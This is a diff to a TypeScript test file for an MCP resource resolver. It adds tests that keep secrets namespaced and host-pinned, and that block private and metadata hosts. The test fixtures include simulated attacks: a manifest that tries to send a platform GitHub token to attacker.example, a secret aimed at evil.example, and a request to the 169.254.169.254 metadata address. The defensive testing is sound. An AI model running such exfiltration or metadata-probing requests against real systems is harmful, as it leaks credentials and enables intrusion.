@@ -13,15 +13,24 @@ function fakeFetch(responseBody: unknown, ok = true, status = 200) {
     return {
       ok,
       status,
-      async json() {
-        return responseBody
+      headers: { get: () => null },
+      async text() {
+        return JSON.stringify(responseBody)
       },
     } as unknown as Response
   }) as unknown as typeof fetch
   return { fn, calls }
 }
 
-const ENV = { TENANT_SLUG: 't', GHL_API_KEY: 'secret-xyz' } as unknown as Env
+// Namespaced + host-pinned secret: a loop may name LOOP_SECRET_ghl, which is only
+// ever sent to the host pinned in LOOP_SECRET_ghl_HOST. Platform secrets live outside
+// the LOOP_SECRET_ prefix and are unreachable from a manifest.
+const ENV = {
+  TENANT_SLUG: 't',
+  LOOP_SECRET_ghl: 'secret-xyz',
+  LOOP_SECRET_ghl_HOST: 'x',
+  GITHUB_TOKEN: 'platform-secret-must-never-leak',
+} as unknown as Env
 
 describe('resolveResource — mcp', () => {
   it('read() POSTs a tools/call JSON-RPC and parses structuredContent.results', async () => {
@@ -38,20 +47,53 @@ describe('resolveResource — mcp', () => {
     expect(body.params).toEqual({ name: 'search', arguments: { query: 'manufacturers', limit: 10 } })
   })
 
-  it('resolves the secret from env[auth_ref] as a Bearer header — NEVER from the manifest', async () => {
+  it('resolves a namespaced, host-pinned secret as a Bearer header — NEVER from the manifest', async () => {
     const { fn, calls } = fakeFetch({ result: { structuredContent: { results: [] } } })
-    // The ref names GHL_API_KEY (an env binding) and also carries a decoy inline field.
-    const ref = { kind: 'mcp' as const, url: 'https://x/mcp', auth_ref: 'GHL_API_KEY', secret: 'ATTACKER-INLINE' }
+    // ref names the logical 'ghl' secret + carries a decoy inline field.
+    const ref = { kind: 'mcp' as const, url: 'https://x/mcp', auth_ref: 'ghl', secret: 'ATTACKER-INLINE' }
     const r = resolveResource(ENV, ref, { fetchFn: fn })
     await r.read('q')
     const headers = (calls[0].init.headers ?? {}) as Record<string, string>
-    expect(headers.authorization).toBe('Bearer secret-xyz') // from env, not the ref
+    expect(headers.authorization).toBe('Bearer secret-xyz') // from LOOP_SECRET_ghl, pinned to host 'x'
     expect(JSON.stringify(calls[0].init)).not.toContain('ATTACKER-INLINE')
   })
 
-  it('omits the auth header when auth_ref names a missing binding', async () => {
+  it('P0: a manifest CANNOT exfiltrate a platform secret to an attacker URL', async () => {
     const { fn, calls } = fakeFetch({ result: { structuredContent: { results: [] } } })
-    const r = resolveResource(ENV, { kind: 'mcp', url: 'https://x/mcp', auth_ref: 'NOPE' }, { fetchFn: fn })
+    // Attack: bind an attacker URL + name a platform secret. GITHUB_TOKEN is not under
+    // the LOOP_SECRET_ prefix, so it is unreachable → no auth header, secret never sent.
+    const ref = { kind: 'mcp' as const, url: 'https://attacker.example/mcp', auth_ref: 'GITHUB_TOKEN' }
+    const r = resolveResource(ENV, ref, { fetchFn: fn })
+    await r.read('q')
+    const headers = (calls[0].init.headers ?? {}) as Record<string, string>
+    expect(headers.authorization).toBeUndefined()
+    expect(JSON.stringify(calls[0].init)).not.toContain('platform-secret-must-never-leak')
+  })
+
+  it('refuses to send a secret to an unpinned host (fail closed)', () => {
+    // LOOP_SECRET_ghl exists but is pinned to host 'x'; this url is a different host.
+    const env = { ...ENV } as unknown as Env
+    expect(() =>
+      resolveResource(env, { kind: 'mcp', url: 'https://evil.example/mcp', auth_ref: 'ghl' }, { fetchFn: fakeFetch({}).fn }),
+    ).toThrow('mcp_secret_host_mismatch')
+  })
+
+  it('refuses a secret with no host pin', () => {
+    const env = { TENANT_SLUG: 't', LOOP_SECRET_np: 'sek' } as unknown as Env // no _HOST
+    expect(() =>
+      resolveResource(env, { kind: 'mcp', url: 'https://x/mcp', auth_ref: 'np' }, { fetchFn: fakeFetch({}).fn }),
+    ).toThrow('mcp_secret_host_not_pinned')
+  })
+
+  it('rejects a blocked (private/metadata) host at resolve time', () => {
+    expect(() =>
+      resolveResource(ENV, { kind: 'mcp', url: 'https://169.254.169.254/mcp' }, { fetchFn: fakeFetch({}).fn }),
+    ).toThrow('mcp_url_blocked_host')
+  })
+
+  it('omits the auth header when auth_ref names a missing LOOP_SECRET binding', async () => {
+    const { fn, calls } = fakeFetch({ result: { structuredContent: { results: [] } } })
+    const r = resolveResource(ENV, { kind: 'mcp', url: 'https://x/mcp', auth_ref: 'nope' }, { fetchFn: fn })
     await r.read('q')
     const headers = (calls[0].init.headers ?? {}) as Record<string, string>
     expect(headers.authorization).toBeUndefined()
